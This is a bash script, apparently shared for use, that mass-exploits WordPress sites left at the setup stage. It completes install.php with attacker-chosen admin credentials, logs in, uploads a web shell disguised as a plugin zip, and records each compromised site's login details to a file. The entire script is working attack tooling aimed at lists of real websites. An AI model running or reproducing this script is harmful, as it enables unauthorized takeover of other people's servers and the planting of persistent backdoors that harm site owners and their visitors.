#!/bin/bash
#Coded By Con7ext
green='\e[92m'
blue='\e[34m'
red='\e[31m'
white='\e[39m'
COOKIE=cookie-`date +%s`
BULAN=`date +%m`
TAHUN=`date +%Y`
COOKIE_PATH="/tmp/$COOKIE"
COOKIE_LOG="/tmp/$COOKIE"
USER_AGENT="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
ekse(){
	if [[ $(curl --silent -d "weblog_title=RintoD&user_name=$user&admin_password=$pass&admin_password2=$pass&admin_email=$email&Submit=Install+Wordpress" --url "$site/wp-admin/install.php?step=2") =~ '<h1>Success!</h1>' ]];
	then
	printf "$green[+] Success [+]$white\n"
	echo "$site/wp-login.php" | tee -a $file
	echo "Username : $user" | tee -a $file
	echo "Password : $pass" | tee -a $file
	echo "Email    : $email" | tee -a $file
	login
	upload
	elif [[ $(curl --silent --url "$site/wp-admin/install.php") =~ '<h1>Already Installed</h1>' ]];
	then
	printf "$blue[!] $site Already Installed$white\n\n"
	elif [[ $(curl --silent --url "$site/wp-admin/install.php") =~ 'One or more database tables are unavailable' ]];
	then
	printf "$blue[!] $site Must Be Repair$white\n"
	echo "Repair Url : $site/maint/repair.php?referrer=is_blog_installed"
	else
	printf "$red[-] $site Not Vuln$white\n";
	fi
}
login(){
	curl -s -A "$USER_AGENT" -c "$COOKIE_PATH" $site/wp-login.php > /dev/null
	curl -c "$COOKIE_LOG" --silent -b "$COOKIE_PATH" -d "log=$user&pwd=$pass&wp-submit=Log+in&redirect_to=$site/wp-admin&testcookie=1" --url "$site/wp-login.php"
	status=$(curl --write-out %{http_code}  --silent -b "$COOKIE_PATH" -d "log=$user&pwd=$pass&wp-submit=Log+in&redirect_to=$site/wp-admin&testcookie=1" --url "$site/wp-login.php")
	if [[ $status == 302 ]];
	then
	echo "Login: Success" | tee -a $file
	else
	printf "$red[-]Login Failed$white Try Manual\n"
	fi
	rm "$COOKIE_PATH" 2> /dev/null
}
upload(){
	mek=`curl -s -b "$COOKIE_LOG" --url "$site/wp-admin/plugin-install.php" | grep -Po '(?<=name="_wpnonce" value=")[^"]*()'`
	mik=`curl -s -b "$COOKIE_LOG" --url "$site/wp-admin/plugin-install.php" | grep -Po '(?<=name="_wp_http_referer" value=")[^"]*()'`
	ups=`curl -s -b "$COOKIE_LOG" -F "_wpnonce=$mek" -F "_wp_http_referer=$mik" -F "pluginzip=@$shell" -F "install-plugin-submit=Install+Now" --url "$site/wp-admin/update.php?action=upload-plugin"`
	if [[ "$ups" =~ "Installing Plugin from uploaded file" ]];
	then
	echo "Success Uploading Shell $site/wp-content/uploads/$TAHUN/$BULAN/$shell" | tee -a $file
	else
	echo "Failed Try Manual"
	echo "$ups"
	fi
	rm "$COOKIE_LOG" 2> /dev/null
}
echo "Wp Install Mass Exploit"
echo "File Argumen is for save file :D just put your filename :D"
echo "Created By Con7ext"
read -p "List: " list
read -p "User: " user
read -p "Pass: " pass
read -p "Email: " email
read -p "Shell: " shell
read -p "File: " file
for site in `cat $list`; 
do
		ekse $site &
done
